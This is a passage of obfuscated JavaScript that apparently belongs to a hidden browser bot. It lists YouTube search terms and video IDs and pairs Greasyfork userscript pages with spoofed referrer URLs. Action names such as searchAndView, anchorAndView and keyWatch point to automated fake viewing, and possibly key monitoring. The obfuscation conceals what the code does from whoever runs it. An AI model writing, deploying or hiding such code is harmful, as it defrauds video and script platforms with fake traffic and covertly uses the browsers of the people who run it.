'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x3bd + -0x160 * -0xd + 0xe19 * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2626 + 0x2607 + -0x4c23)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xd3 * 0x2f + 0x19d8 + -0x4092);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    X(0x9, 'ZJL%') + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    Y(0x11) + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': Y(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + X(0x3, '6X7s') + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
